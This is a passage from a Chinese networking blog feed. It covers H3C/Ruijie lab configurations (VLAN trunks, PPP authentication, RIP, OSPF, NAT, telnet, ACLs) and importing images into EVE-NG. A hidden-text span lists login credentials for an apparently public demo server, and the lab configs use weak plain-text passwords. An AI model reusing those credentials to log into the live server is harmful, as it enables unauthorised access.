class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;PC3&gt;ping 192.168.1.10</span><br><span class="line">Ping 192.168.1.10 (192.168.1.10): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=0 ttl=255 time=61.000 ms</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=1 ttl=255 time=24.000 ms</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=2 ttl=255 time=24.000 ms</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=3 ttl=255 time=30.000 ms</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=4 ttl=255 time=23.000 ms</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;PC3&gt;ping 192.168.1.2</span><br><span class="line">Ping 192.168.1.2 (192.168.1.2): 56 data bytes, press CTRL_C to break</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;PC4&gt;ping 192.168.1.10</span><br><span class="line">Ping 192.168.1.10 (192.168.1.10): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=0 ttl=255 time=38.000 ms</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=1 ttl=255 time=14.000 ms</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=2 ttl=255 time=21.000 ms</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=3 ttl=255 time=25.000 ms</span><br><span class="line">56 bytes from 192.168.1.10: icmp_seq=4 ttl=255 time=18.000 ms</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVE-NG镜像导入</title>
      <link href="/posts/14430"/>
      <url>/posts/14430</url>
      
        <content type="html"><![CDATA[<br /><p><img src="/images/EVE-NG%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5/04.jpg"></p><h4 id="锐捷、华三镜像导入流程"><a href="#锐捷、华三镜像导入流程" class="headerlink" title="锐捷、华三镜像导入流程"></a>锐捷、华三镜像导入流程</h4><h5 id="配置模板"><a href="#配置模板" class="headerlink" title="配置模板"></a>配置模板</h5><p><strong>I</strong>.配置模拟器模板</p><ul><li>1）模板文件存放位置:</li></ul><p>intel芯片：<code>/opt/unetlab/html/templates/intel</code></p><p>amd芯片：&#x2F;<code>opt/unetlab/html/templates/amd</code></p><ul><li>2）文件上传(这里我以amd芯片为例)</li></ul><p>在Windows主机左下角”<code>运行</code>“框输入命令</p><p><code>C:/Ruijieroute.yml表示路径</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scp -r C:/Ruijieroute.yml root@192.31.31.202:/opt/unetlab/html/templates/amd</span><br><span class="line">scp -r C:/Ruijieswitch.yml root@192.31.31.202:/opt/unetlab/html/templates/amd</span><br><span class="line">scp -r C:/h3cvsr2k.yml root@192.31.31.202:/opt/unetlab/html/templates/amd</span><br><span class="line">scp -r  C:/h3cvfw1k.yml root@192.31.31.202:/opt/unetlab/html/templates/amd</span><br><span class="line">scp -r C:/h3cvac1k.yml root@192.31.31.202:/opt/unetlab/html/templates/amd</span><br></pre></td></tr></table></figure><ul><li>3）登录EVE-NG后台查看是否上传成功</li></ul><p><img src="/images/EVE-NG%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5/01.jpg"></p><h5 id="配置图标"><a href="#配置图标" class="headerlink" title="配置图标"></a>配置图标</h5><p><strong>II</strong>.配置模拟器镜像图标</p><ul><li><p>1）模拟器镜像图标位置：<code>/opt/unetlab/html/images/icons</code></p></li><li><p>2）上传命令</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scp -r C:/ruijieroute.png root@192.31.31.202:/opt/unetlab/html/images/icons</span><br><span class="line">scp -r C:/ruijieswitch.png root@192.31.31.202:/opt/unetlab/html/images/icons</span><br><span class="line">scp -r C:/h3cvac1k.png root@192.31.31.202:/opt/unetlab/html/images/icons</span><br><span class="line">scp -r C:/h3cvfw1k.png root@192.31.31.202:/opt/unetlab/html/images/icons</span><br><span class="line">scp -r C:/h3cvsr1k.png root@192.31.31.202:/opt/unetlab/html/images/icons</span><br></pre></td></tr></table></figure><h5 id="配置导出脚本"><a href="#配置导出脚本" class="headerlink" title="配置导出脚本"></a>配置导出脚本</h5><p><strong>III</strong>.上传config配置导出脚本</p><p>（通过配置脚本， 可以把配置固化在设备上， 因此用户可以直接把拓扑发送给其他人，其他人可以直接导入有配置的拓扑）</p><ul><li>1)脚本文件位置： <code>/opt/unetlab/scripts</code></li></ul><p>（使用该脚本需要设备配置的用户名和密码都为“ruijie”）</p><ul><li>2)脚本文件上传命令<br><code>scp -r C:/config_ruijie.py root@192.31.31.202:/opt/unetlab/scripts</code></li></ul><h5 id="镜像上传"><a href="#镜像上传" class="headerlink" title="镜像上传"></a>镜像上传</h5><p><strong>Iv</strong>.模拟器镜像上传</p><ul><li>1）镜像存放位置</li></ul><p><code>/qemu/</code>下文件夹没有则创建，文件夹名字对应上传模板名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/opt/unetlab/addons/qemu/Ruijieroute-1.0</span><br><span class="line">/opt/unetlab/addons/qemu/Ruijieswitch-1.0</span><br><span class="line">/opt/unetlab/addons/qemu/h3cvac1k-1.0</span><br><span class="line">/opt/unetlab/addons/qemu/h3cvfw1k-1.0</span><br><span class="line">/opt/unetlab/addons/qemu/h3cvsr2k-1.0</span><br></pre></td></tr></table></figure><ul><li>2）脚本文件上传命令</li></ul><p><code>运行</code>框输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scp -r C:/ hda.qcow2 root@192.31.31.202:/opt/unetlab/addons/qemu/Ruijieroute-1.0</span><br><span class="line">scp -r C:/ hda.qcow2 root@192.31.31.202:/opt/unetlab/addons/Ruijieswitch-1.0</span><br><span class="line">scp -r C:/ hda.qcow2 root@192.31.31.202:/opt/unetlab/addons/qemu/h3cvac1k-1.0</span><br><span class="line">scp -r C:/ hda.qcow2 root@192.31.31.202:/opt/unetlab/addons/qemu/h3cvfw1-1.0</span><br><span class="line">scp -r C:/ hda.qcow2 root@192.31.31.202:/opt/unetlab/addons/qemu/h3cvsr2k-1.0</span><br></pre></td></tr></table></figure><h5 id="修复权限"><a href="#修复权限" class="headerlink" title="修复权限"></a>修复权限</h5><p><strong>V</strong>.全部配置完成后，需要输入命令修复相关权限</p><p>修复命令： <code>unl_wrapper -a fixpermissions</code></p><p><strong>VI</strong>.测试</p><p><img src="/images/EVE-NG%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5/02.jpg"><em>已完成导入</em></p><p><img src="/images/EVE-NG%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5/03.jpg"></p><p><img src="/images/EVE-NG%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5/05.jpg"></p><br /><br /><hr><p><em>线上测试地址： <a href="https://demo.emulatedlab.com:23333/">点击进入</a></em><br><em>注意：禁止在Shared目录下创建Lab！！</em>！</p><p><span class="heimu">editor权限免费试用账号：test01&#x2F;eve （限制4核8g）test02&#x2F;eve (限制4核8g)</span><br><span class="heimu">user权限免费试用账号：user01&#x2F;eve（限制4核8g）user02&#x2F;eve (限制4核8g)</span></p><hr>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实验02</title>
      <link href="/posts/62946"/>
      <url>/posts/62946</url>
      
        <content type="html"><![CDATA[<br /><br /><h2 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h2><p><img src="/images/%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C02/01.jpg"><em>无特殊说明，IP地址按照设备尾号数字标识</em></p><p><strong>i</strong>.在S1与S2之间运行Trunk协议使PC1与PC3通信<br>（PC1与PC3处于同一VLAN）。</p><p><em>注：两台交换机之间需要配置Trunk才能实现不同交换机下的同一个VLAN互相访问。</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[H3C]sysname S1</span><br><span class="line">[S1]vlan 10</span><br><span class="line">[S1-vlan10]port g1/0/1</span><br><span class="line">[S1-vlan10]vlan 20</span><br><span class="line">[S1-vlan20]port g1/0/2</span><br><span class="line">[S1-vlan20]int g1/0/4</span><br><span class="line">[S1-GigabitEthernet1/0/4]port link-type trunk</span><br><span class="line">[S1-GigabitEthernet1/0/4]port trunk permit vlan all</span><br><span class="line">[S1-GigabitEthernet1/0/4]int g1/0/3</span><br><span class="line">[S1-GigabitEthernet1/0/3]port link-type trunk</span><br><span class="line">[S1-GigabitEthernet1/0/3]port trunk permit vlan all</span><br><span class="line">[S1-GigabitEthernet1/0/3]qu</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[H3C]sysname S2</span><br><span class="line">[S2]vlan 10</span><br><span class="line">[S2-vlan10]port g1/0/2</span><br><span class="line">[S2-vlan10]qu</span><br><span class="line">[S2]int g1/0/1</span><br><span class="line">[S2-GigabitEthernet1/0/1]port link-type trunk</span><br><span class="line">[S2-GigabitEthernet1/0/1]port trunk permit vlan all</span><br></pre></td></tr></table></figure><p><strong>ii</strong>.在R1做单臂路由使PC1与PC2通信。<br><em>注：单臂路由就是在路由器以太网接口下配置若干个子接口，每个子接口对应一个VLAN，这样当路由器的以太网口连接到一个划分VLAN的二层交换机时，可以通过路由器的以太网口，实现二层交换机上多个VLAN之间的互通。而三层交换机的VLAN之间互通，则不需要路由器的配合，可在三层交换机上直接配置VLAN虚接口，每个VLAN一个虚接口，并指定IP，通过VLAN虚接口实现交换机各个VLAN之间的互通。</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[R1]int g0/0.1</span><br><span class="line">[R1-GigabitEthernet0/0.1]vlan-type dotlq vid 10</span><br><span class="line">[R1-GigabitEthernet0/0.1]ip add 192.168.10.254 24</span><br><span class="line">[R1-GigabitEthernet0/0.1]qu</span><br><span class="line">[R1] int g0/0.2</span><br><span class="line">[R1-GigabitEthernet0/0.2]vlan-type dotlq vid 20</span><br><span class="line">[R1-GigabitEthernet0/0.2]ip add 192.168.20.254 24</span><br><span class="line">[R1-GigabitEthernet0/0.2]qu</span><br></pre></td></tr></table></figure><p><strong>iii</strong>.R1与R2之间运行PPP协议采用PAP认证；<br><em>注：PPP协议是一种点到点在串行链路上传输IP数据包的方法。MP可以增加设备之间的互联带宽，增加设备之间的链路可靠性，提高数据转发的效率。</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R1:</span><br><span class="line">[R1]int s1/0</span><br><span class="line">[R1-Serial1/0]ip address 10.19.0.1 24</span><br><span class="line">[R1-Serial1/0]local-user papr2 class network</span><br><span class="line">New local user added.</span><br><span class="line">[R1-luser-network-papr2]password simple 666</span><br><span class="line">[R1-luser-network-papr2]service-type ppp</span><br><span class="line">[R1-luser-network-papr2]qu</span><br><span class="line">[R1]int s1/0</span><br><span class="line">[R1-Serial1/0]ppp authentication-mode pap</span><br><span class="line"> R2:</span><br><span class="line">[R2]int s1/0</span><br><span class="line">[R2-Serial1/0]</span><br><span class="line">[R2-Serial1/0]</span><br><span class="line">[R2-Serial1/0]ip add 10.19.0.2 24</span><br><span class="line">[R2-Serial1/0]ppp pap local-user papr2 password simple 666</span><br></pre></td></tr></table></figure><p><strong>iv</strong>.R2与R3运行PPP协议采用CHAP双向认证；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">R2:</span><br><span class="line">[R2]local-user zhangdaye class network</span><br><span class="line">New local user added.</span><br><span class="line">[R2-luser-network-r3]password simple 666</span><br><span class="line">[R2-luser-network-r3]service-type ppp</span><br><span class="line">[R2-luser-network-r3]qu</span><br><span class="line">[R2]int s2/0</span><br><span class="line">[R2-Serial2/0]ip add 10.19.1.1 24</span><br><span class="line">[R2-Serial2/0]ppp authentication-mode chap</span><br><span class="line">[R2-Serial2/0]ppp chap user zhangdaye</span><br><span class="line">[R2-Serial2/0]</span><br><span class="line">R3:</span><br><span class="line">[R3]local-user zhangdaye class network</span><br><span class="line">New local user added.</span><br><span class="line">[R3-luser-network-r2]password simple 666</span><br><span class="line">[R3-luser-network-r2]service-type ppp</span><br><span class="line">[R3-luser-network-r2]qu</span><br><span class="line">[R3]int s1/0</span><br><span class="line">[R3-Serial1/0]ip add 10.19.1.2 24</span><br><span class="line">[R3-Serial1/0]ppp chap user zhangdaye</span><br></pre></td></tr></table></figure><p><strong>v</strong>.为了加大带宽R2与RTA之间采用PPP MP捆绑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R2:</span><br><span class="line">[R2]int mp-group 1</span><br><span class="line">[R2-MP-group1]ip address 19.0.0.1 29</span><br><span class="line">[R2-MP-group1]qu</span><br><span class="line">[R2]int s3/0</span><br><span class="line">[R2-Serial3/0]ppp mp mp-group 1</span><br><span class="line">[R2-Serial3/0]int s4/0</span><br><span class="line">[R2-Serial4/0]ppp mp mp-group 1</span><br><span class="line">[R2-Serial4/0]qu</span><br><span class="line">RTA:</span><br><span class="line">[RTA]int mp-group 1</span><br><span class="line">[RTA-MP-group1]ip add 19.0.0.2 29</span><br><span class="line">[RTA-MP-group1]int s1/0</span><br><span class="line">[RTA-Serial1/0]ppp mp MP-group 1</span><br><span class="line">[RTA-Serial1/0]int s2/0</span><br><span class="line">[RTA-Serial2/0]ppp mp mp-group 1</span><br></pre></td></tr></table></figure><p><strong>vi</strong>.内部网络采用RIP动态路由使内部网络互通；</p><p><em>注：OSPF多区域有利于改善网络的可扩展性，快速收敛。loopback地址叫回环地址，为了方便管理，会为每一台路由器创建一个loopback接口，并在该接口上单独指定一个IP地址作为管理地址，管理员使用该地址对路由器远程登录。</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">R1:</span><br><span class="line">[R1]rip 10</span><br><span class="line">[R1-rip-10]</span><br><span class="line">[R1-rip-10]network 10.19.0.0 0.0.0.255</span><br><span class="line">[R1-rip-10]network 192.168.10.0</span><br><span class="line">[R1-rip-10]network 192.168.20.0</span><br><span class="line">R2:</span><br><span class="line">[R2]rip 10</span><br><span class="line">[R2-rip-10]network 10.19.0.0 0.0.0.255</span><br><span class="line">[R2-rip-10]network 10.19.1.0 0.0.0.255</span><br><span class="line">R3:</span><br><span class="line">[R3]rip 10</span><br><span class="line">[R3-rip-10]network 10.19.1.0 0.0.0.255</span><br></pre></td></tr></table></figure><p><strong>vii</strong>.RTA，RTB，RTC，RTD之间采用OSPF多区域路由配置loopback地址并宣告；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">RTA:</span><br><span class="line">&lt;RTA&gt;sys</span><br><span class="line">System View: return to User View with Ctrl+Z.</span><br><span class="line">[RTA]int g0/0</span><br><span class="line">[RTA-GigabitEthernet0/0]ip add 19.0.100.1 30</span><br><span class="line">[RTA-GigabitEthernet0/0]qu</span><br><span class="line">[RTA]int loopback 0</span><br><span class="line">[RTA-LoopBack0]ip add 1.1.1.1 32</span><br><span class="line">[RTA-LoopBack0]qu</span><br><span class="line">[RTA]int g0/1</span><br><span class="line">[RTA-GigabitEthernet0/1]ip add 19.0.100.5 30</span><br><span class="line">[RTA-GigabitEthernet0/1]qu</span><br><span class="line">[RTA]</span><br><span class="line"></span><br><span class="line">RTB:</span><br><span class="line">[RTB]int g0/0</span><br><span class="line">[RTB-GigabitEthernet0/0]ip add 19.0.100.2 30</span><br><span class="line">[RTB-GigabitEthernet0/0]int g0/1</span><br><span class="line">[RTB-GigabitEthernet0/1]ip add 19.0.200.1 30</span><br><span class="line">[RTB-GigabitEthernet0/1]qu</span><br><span class="line">[RTB]int loopback 0</span><br><span class="line">[RTB-LoopBack0]ip add 1.1.1.2 32</span><br><span class="line">[RTB-LoopBack0]qu</span><br><span class="line">[RTB]</span><br><span class="line"></span><br><span class="line">RTC:</span><br><span class="line">[RTC]int g0/0</span><br><span class="line">[RTC-GigabitEthernet0/0]ip add 19.0.100.6 30</span><br><span class="line">[RTC-GigabitEthernet0/0]qu</span><br><span class="line">[RTC]int loopback 0</span><br><span class="line">[RTC-LoopBack0]ip add 1.1.1.3 32</span><br><span class="line">[RTC-LoopBack0]qu</span><br><span class="line"></span><br><span class="line">RTD:</span><br><span class="line">[RTD]int g0/0</span><br><span class="line">[RTD-GigabitEthernet0/0]ip add 19.0.200.2 30</span><br><span class="line">[RTD-GigabitEthernet0/0]qu</span><br><span class="line">[RTD]int loopback 0</span><br><span class="line">[RTD-LoopBack0]ip add 1.1.1.4 32</span><br><span class="line">[RTD-LoopBack0]qu</span><br><span class="line">[RTD]</span><br><span class="line"></span><br><span class="line">添加ospf:</span><br><span class="line">RTA:</span><br><span class="line">[RTA]ospf 100</span><br><span class="line">[RTA-ospf-100]area 0</span><br><span class="line">[RTA-ospf-100-area-0.0.0.0]network 1.1.1.1 0.0.0.0</span><br><span class="line">[RTA-ospf-100-area-0.0.0.0]network 19.0.100.1 0.0.0.3</span><br><span class="line">[RTA-ospf-100-area-0.0.0.0]qu</span><br><span class="line">[RTA-ospf-100]area 2</span><br><span class="line">[RTA-ospf-100-area-0.0.0.2]network 19.0.100.5 0.0.0.3</span><br><span class="line"></span><br><span class="line">RTB:</span><br><span class="line">[RTB]ospf 100</span><br><span class="line">[RTB-ospf-100]area 0</span><br><span class="line">[RTB-ospf-100-area-0.0.0.0]network 1.1.1.2 0.0.0.0</span><br><span class="line">[RTB-ospf-100-area-0.0.0.0]network 19.0.100.2 0.0.0.3</span><br><span class="line">[RTB-ospf-100-area-0.0.0.0]qu</span><br><span class="line">[RTB-ospf-100]area 1</span><br><span class="line">[RTB-ospf-100-area-0.0.0.1]network 19.0.200.1 0.0.0.3</span><br><span class="line">[RTB-ospf-100-area-0.0.0.1]qu</span><br><span class="line"></span><br><span class="line">RTC:</span><br><span class="line">[RTC]</span><br><span class="line">[RTC]ospf 100</span><br><span class="line">[RTC-ospf-100]area 2</span><br><span class="line">[RTC-ospf-100-area-0.0.0.2]network 1.1.1.3 0.0.0.0</span><br><span class="line">[RTC-ospf-100-area-0.0.0.2]network 19.0.100.6 0.0.0.3</span><br><span class="line"></span><br><span class="line">RTD:</span><br><span class="line">[RTD]ospf 100</span><br><span class="line">[RTD-ospf-100]area 1</span><br><span class="line">[RTD-ospf-100-area-0.0.0.1]network 1.1.1.4 0.0.0.0</span><br><span class="line">[RTD-ospf-100-area-0.0.0.1]network 19.0.200.2 0.0.0.3</span><br><span class="line">[RTD-ospf-100-area-0.0.0.1]qu</span><br><span class="line"></span><br><span class="line">R2与RTA之间运行静态路由</span><br><span class="line">静态路由：</span><br><span class="line">RTA:</span><br><span class="line">[RTA]ip route-static 10.19.0.0 0 19.0.0.1</span><br><span class="line">[RTA]ospf 100</span><br><span class="line">[RTA-ospf-100]import-route static</span><br><span class="line">[RTA-ospf-100]import-route direct</span><br><span class="line">[RTA-ospf-100]</span><br><span class="line"></span><br><span class="line">R2:</span><br><span class="line">[R2]ip route-static 0.0.0.0 0.0.0.0 19.0.0.2</span><br><span class="line">R1:</span><br><span class="line">[R1]ip route-static 0.0.0.0 0.0.0.0 10.19.0.2</span><br><span class="line">R3:</span><br><span class="line">[R3]ip route-static 0.0.0.0 0.0.0.0 10.19.1.1</span><br></pre></td></tr></table></figure><p><strong>viii</strong>.在R3上配置telnet服务不加密认证；在RTD上配置telnet服务并设置密码认证；在RTC上配置telnet服务并设置用户认证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">R3:</span><br><span class="line">[R3]telnet server enable</span><br><span class="line">[R3]line vty 0</span><br><span class="line">[R3-line-vty0]authentication-mode none</span><br><span class="line">[R3-line-vty0]</span><br><span class="line"></span><br><span class="line">RTD:</span><br><span class="line">[RTD]telnet server enable</span><br><span class="line">[RTD]line vty 0</span><br><span class="line">[RTD-line-vty0]authentication-mode password</span><br><span class="line">[RTD-line-vty0]set authentication password simple 666</span><br><span class="line">[RTD-line-vty0]user-role telnet-admin</span><br><span class="line">[RTD-line-vty0]</span><br><span class="line"></span><br><span class="line">RTC:</span><br><span class="line">[RTC]telnet server enable</span><br><span class="line">[RTC]line vty 0</span><br><span class="line">[RTC-line-vty0]authentication-mode scheme</span><br><span class="line">[RTC-line-vty0]qu</span><br><span class="line">[RTC]local-user telnetrtc</span><br><span class="line">New local user added.</span><br><span class="line">[RTC-luser-manage-telnetrtc]password simple 666</span><br><span class="line">[RTC-luser-manage-telnetrtc]service-type telnet</span><br><span class="line">[RTC-luser-manage-telnetrtc]authorization-attribute user-role telnet-admin</span><br></pre></td></tr></table></figure><p><strong>ix</strong>.在R2上做NAT服务使内部网络访问Internet；<br><em>注：NAT网络地址转换，实现内网的IP地址与公网的地址之间的相互转换，将大量的内网IP地址转换为一个或少量的公网IP地址，在一个局域网内，只需要一台计算机连接上Internet，就可以利用NAT共享Internet连接，使局域网内其他计算机也可以上网。使用NAT协议，局域网内的计算机可以访问Internet上的计算机，但Internet上的计算机无法访问局域网内的计算机。一方面减少对公网IP地址的占用，同时隐藏了内部网络结构，降低内部网络受到攻击的风险。</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">R2:</span><br><span class="line">[R2]acl basic 2000</span><br><span class="line">[R2-acl-ipv4-basic-2000]rule 0 permit source 192.168.0.0 0.0.0.255</span><br><span class="line">[R2-acl-ipv4-basic-2000]rule 1 permit source 10.19.0.0 0.0.0.255</span><br><span class="line">[R2-acl-ipv4-basic-2000]qu</span><br><span class="line">[R2]nat address-group 1</span><br><span class="line">[R2-address-group-1]address 19.0.0.3 19.0.0.6</span><br><span class="line">[R2-address-group-1]qu</span><br><span class="line">[R2]int mp-group 1</span><br><span class="line">[R2-MP-group1]nat outbound 2000 address-group 1</span><br><span class="line">[R2-MP-group1]qu</span><br></pre></td></tr></table></figure><p><strong>x</strong>.在R2上配置NAT Server服务使RTD能正常访问R3的telnet服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R2]interface mp-group 1</span><br><span class="line">[R2-MP-group1]nat server protocol tcp global 19.0.200.2 telnet inside 10.19.1.2 telnet</span><br></pre></td></tr></table></figure><p><strong>xi</strong>.使用ACL访问控制列表实现：<br><em>访问控制列表(ACL)是应用在路由器接口的指令列表(即规则)，这些指令列表用来告诉路由器，那些数据包可以接受，那些数据包需要拒绝。ACL使用包过滤技术，在路由器上读取OSI七层模型的第3层和第4层包头中的信息。如源地址、目标地址、源端口、目标端口等，根据预先定义好的规则对包进行过滤，从而达到访问控制的目的。</em></p><p><strong>禁止PC2访问RTC所有服务</strong></p><p><strong>禁止R1访问RTD的telnet服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[R2]acl advanced 3000</span><br><span class="line">[R2-acl-ipv4-adv-3000]rule deny 